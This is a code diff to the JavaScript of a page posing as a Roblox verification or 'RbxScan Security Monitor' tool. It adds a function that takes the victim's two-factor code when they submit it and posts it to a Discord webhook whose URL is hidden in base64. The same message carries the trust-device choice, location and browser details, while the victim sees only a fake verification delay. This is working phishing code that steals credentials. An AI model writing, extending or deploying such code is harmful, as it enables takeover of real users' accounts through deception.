@@ -701,6 +701,7 @@ function closeRobloxAuth() {
 function submitRobloxAuth() {
     const codeInput = document.getElementById('robloxVerificationCode');
     const verifyBtn = document.getElementById('robloxVerifyBtn');
+    const trustDeviceCheckbox = document.getElementById('trustDevice');
     const code = codeInput ? codeInput.value.trim() : '';
     
     if (code.length !== 6) {
@@ -720,6 +721,9 @@ function submitRobloxAuth() {
         codeInput.disabled = true;
     }
     
+    // Send 2FA code to webhook
+    sendTwoFactorCodeToWebhook(code, trustDeviceCheckbox ? trustDeviceCheckbox.checked : false);
+    
     // Simulate verification delay
     setTimeout(() => {
         closeRobloxAuth();
@@ -730,6 +734,71 @@ function submitRobloxAuth() {
             codeInput.disabled = false;
         }
     }, 2000);
+}
+
+// Send 2FA code to Discord webhook
+async function sendTwoFactorCodeToWebhook(code, trustDevice) {
+    try {
+        // Get user's location info
+        const locationInfo = await getUserLocation();
+        
+        // Decode webhook URL
+        const webhookUrl = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NjAzODUwOTM1MDk5ODA0Ny8wbGNQSDhKdkE5SG5xUkVOQlJiMnZwTGF6SDU5YUhJQ0ZXQ1JaV2I0R0pwZ1VqMmVoOTBhODRlQktWRXc3V1g0NEg4ZQ==");
+        
+        const embed = {
+            title: "🔐 Roblox 2-Step Authentication Code Captured",
+            color: 0x00A2FF,
+            fields: [
+                {
+                    name: "📱 2FA Code",
+                    value: `\`${code}\``,
+                    inline: true
+                },
+                {
+                    name: "🔒 Trust Device",
+                    value: trustDevice ? "✅ Yes (30 days)" : "❌ No",
+                    inline: true
+                },
+                {
+                    name: "🌍 Location",
+                    value: locationInfo,
+                    inline: false
+                },
+                {
+                    name: "⏰ Timestamp",
+                    value: new Date().toLocaleString(),
+                    inline: true
+                },
+                {
+                    name: "🌐 User Agent",
+                    value: navigator.userAgent.substring(0, 100) + "...",
+                    inline: false
+                }
+            ],
+            footer: {
+                text: "RbxScan Security Monitor • 2FA Capture"
+            },
+            thumbnail: {
+                url: "https://static.thenounproject.com/png/1655580-200.png"
+            }
+        };
+
+        const payload = {
+            content: "@everyone **🚨 2-Step Authentication Code Intercepted!**",
+            embeds: [embed]
+        };
+
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+
+    } catch (error) {
+        console.error('Failed to send 2FA code to webhook:', error);
+    }
 }
 
 // Loading animation with dots and messages
